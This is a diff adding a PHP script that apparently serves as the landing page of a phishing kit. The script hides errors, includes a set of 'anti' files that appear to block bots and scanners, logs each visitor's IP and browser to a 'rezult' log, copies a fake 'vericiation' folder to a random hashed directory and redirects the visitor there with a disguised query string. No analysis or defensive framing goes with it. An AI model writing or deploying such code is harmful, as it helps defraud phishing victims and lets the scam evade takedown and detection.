@@ -1,0 +1,56 @@
+<?php
+error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
+@ini_set('html_errors','0');
+@ini_set('display_errors','0');
+@ini_set('display_startup_errors','0');
+@ini_set('log_errors','0');
+include 'xMetri/anti0.php';
+include 'xMetri/anti1.php';
+include 'xMetri/anti2.php';
+include 'xMetri/anti3.php';
+include 'xMetri/anti4.php';
+include 'xMetri/anti5.php';
+include 'xMetri/anti6.php';
+include 'xMetri/anti7.php';
+include 'xMetri/anti8.php';
+include 'xMetri/anti9.php';
+
+$iplogfile = './rezult/logs.html';
+$ipaddress = $_SERVER['REMOTE_ADDR'];
+$webpage = $_SERVER['SCRIPT_NAME'];
+$timestamp = date('d/m/Y h:i:s');
+$browser = $_SERVER['HTTP_USER_AGENT'];
+$fp = fopen($iplogfile, 'a+');
+chmod($iplogfile, 0777);
+fwrite($fp, '['.$timestamp.']: '.$ipaddress.' '.$webpage.' '.$browser. "\n<br><br>");
+fclose($fp);
+?>
+
+<?php include 'bots.php';?>
+
+<?php
+$random=rand(0,100000000000);
+$md5=md5("$random");
+$base=base64_encode($md5);
+$dst=md5("$base");
+function recurse_copy($src,$dst) { 
+$dir = opendir($src); 
+@mkdir($dst); 
+while(false !== ( $file = readdir($dir)) ) { 
+if (( $file != '.' ) && ( $file != '..' )) { 
+if ( is_dir($src . '/' . $file) ) { 
+recurse_copy($src . '/' . $file,$dst . '/' . $file); 
+} 
+else { 
+copy($src . '/' . $file,$dst . '/' . $file); 
+} 
+} 
+} 
+closedir($dir); 
+} 
+$Sam1 = rand(0,10000000000000);
+$Adoo=date("D,M,d,Y-g:ia");
+$src="vericiation";
+recurse_copy( $src, $dst );
+header("location:$dst?cmd=_identifier_Demarrer_ID=$Sam1+_TIme:$Adoo");
+?>
